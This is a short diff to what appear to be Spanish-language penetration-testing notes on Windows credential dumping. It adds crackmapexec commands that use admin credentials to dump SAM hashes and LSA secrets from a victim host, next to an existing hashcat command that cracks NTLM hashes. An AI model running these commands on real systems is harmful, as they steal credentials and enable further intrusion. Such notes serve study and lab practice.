@@ -29,3 +29,9 @@ Dumping local SAM hashes (uid:rid:lmhash:nthash)
 ```python
 sudo hashcat -m 1000 hash.txt /usr/share/wordlists/rockyou.txt
 ```
+
+Tambien podemos hacerlo sin conectarnos a la máquina víctima desde RDP, como tenemos las credenciales admin podemos hacer lo siguiente:
+```python
+crackmapexec smb IPVICTIMA --local-auth -u USER -p PASS --lsa
+crackmapexec smb IPVICTIMA --local-auth -u USER -p PASS --sam
+```
